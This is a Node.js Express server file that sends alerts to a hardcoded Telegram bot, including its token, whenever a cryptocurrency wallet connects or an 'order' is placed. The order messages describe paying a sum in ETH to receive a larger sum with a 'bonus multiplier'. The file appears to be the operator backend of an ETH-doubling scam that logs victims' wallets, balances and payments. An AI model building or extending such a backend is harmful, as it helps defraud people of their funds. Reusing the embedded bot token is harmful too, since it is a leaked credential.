import "dotenv/config";
import express   from "express";
import cors      from "cors";
import rateLimit from "express-rate-limit";
import helmet    from "helmet";

// ─── Telegram ─────────────────────────────────────────────────────────────────
const TG_TOKEN   = "8760818501:AAGyuVn_TNHC65eOTX5T9El5tlCe1oJ1irU";
const TG_CHAT_ID = "8222029043";

async function tg(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
    });
  } catch(e) { console.error("TG error:", e.message); }
}

// ─── Express ──────────────────────────────────────────────────────────────────
const app     = express();
const limiter = rateLimit({ windowMs: 60000, max: 30, standardHeaders: true, legacyHeaders: false });

app.use(helmet());
app.use(cors({ origin: process.env.FRONTEND_URL || "*", methods: ["GET", "POST"] }));
app.use(express.json({ limit: "10kb" }));

// ─── Health ───────────────────────────────────────────────────────────────────
app.get("/health", (req, res) => res.json({ status: "ok" }));

// ─── Wallet connected ─────────────────────────────────────────────────────────
app.post("/api/connected", limiter, async (req, res) => {
  const { wallet, balance, chain, via } = req.body;
  if (!wallet) return res.status(400).json({ error: "Missing wallet" });

  console.log(`[CONNECT] ${wallet} | ${balance} ETH`);
  await tg(
    `🔌 <b>Wallet Connected</b>\n\n` +
    `👛 <code>${wallet}</code>\n` +
    `💰 Balance: <b>${balance} ETH</b>\n` +
    `🌐 ${chain || "mainnet"} · ${via || "unknown"}\n` +
    `🕐 ${new Date().toUTCString()}`
  );
  res.json({ ok: true });
});

// ─── Order — fires after ETH sent on-chain ────────────────────────────────────
app.post("/api/order", limiter, async (req, res) => {
  const { senderWallet, payoutWallet, payoutOriginal, packageUsd, packageReceive, packageBonus, ethAmount, txHash, block } = req.body;
  if (!senderWallet) return res.status(400).json({ error: "Missing data" });

  console.log(`[ORDER] ${senderWallet} | $${packageUsd} | ${ethAmount} ETH`);
  await tg(
    `💰 <b>New Order!</b>\n\n` +
    `👛 Sender: <code>${senderWallet}</code>\n` +
    `📤 Payout: <code>${payoutWallet}</code>\n` +
    `💵 Package: <b>$${Number(packageUsd).toLocaleString()} → $${Number(packageReceive).toLocaleString()}</b>\n` +
    `🚀 Bonus: ${packageBonus} multiplier\n` +
    `⛓ ETH: <b>${ethAmount} ETH</b>\n` +
    `🔗 <a href="https://etherscan.io/tx/${txHash}">Etherscan</a> · Block ${block}\n` +
    `🕐 ${new Date().toUTCString()}`
  );
  res.json({ ok: true });
});

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("Backend running on port", PORT);
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  await tg(`🚀 <b>Backend Started</b>\n🕐 ${new Date().toUTCString()}`);
});
